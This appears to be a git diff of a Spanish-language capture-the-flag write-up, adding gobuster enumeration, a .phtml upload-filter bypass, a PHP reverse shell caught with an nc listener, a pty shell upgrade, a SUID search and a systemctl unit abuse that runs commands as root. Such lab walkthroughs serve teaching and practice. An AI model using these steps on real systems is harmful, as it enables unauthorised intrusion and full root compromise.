@@ -78,7 +78,7 @@ gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirbuster/directory-list
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.201.63.160:3333
+[+] Url:                     http://$IP:3333
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
@@ -88,10 +88,10 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/images               (Status: 301) [Size: 322] [--> http://10.201.11.252:3333/images/]                                                                   
-/css                  (Status: 301) [Size: 319] [--> http://10.201.11.252:3333/css/]                                                                      
-/js                   (Status: 301) [Size: 318] [--> http://10.201.11.252:3333/js/]                                                                       
-/internal             (Status: 301) [Size: 324] [--> http://10.201.11.252:3333/internal/] 
+/images               (Status: 301) [Size: 322] [--> http://$IP:3333/images/]                                                                   
+/css                  (Status: 301) [Size: 319] [--> http://$IP:3333/css/]                                                                      
+/js                   (Status: 301) [Size: 318] [--> http://$IP:3333/js/]                                                                       
+/internal             (Status: 301) [Size: 324] [--> http://$IP:3333/internal/] 
 ```
 **Resultado relevante**
 
@@ -147,6 +147,58 @@ Aplicamos una wordlist de extensiones (phpext.txt) como payload para identificar
 </details>
 
 **Resultado**
-* Extensión permitida: `.phtml` 
-## Reverse Shell
+* Extensión permitida: `.phtml`
 
+---
+
+## Reverse Shell
+Editamos script de reverse shell con nuestra IP y Port a escuchar. Además, le agregamos la extensión permitida.
+**Script Reverse Shell**
+```bash
+	http://$IP:<port>/<path>/php-reverse-shell.phtml
+```
+
+**Execute Payload**
+```bash
+	http://$IP:<port>/<path>/php-reverse-shell.phtml
+```
+
+**Listen Port**
+```bash
+	nc -lvnp 4444             
+	listening on [any] 4444 ...
+	connect to [$IP] from (UNKNOWN) [$IP] 45390
+	Linux $IP 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+	 14:46:58 up 3 min,  0 users,  load average: 0.82, 0.38, 0.14
+	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	$ whoami
+	www-data
+```
+
+**Upgrade Shell**
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+## Privilege Escalation
+
+**Find SUID perm**
+```bash
+ find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+**
+```bash
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+```
+
+www-data@ip-10-201-113-188:/$ cd /tmp
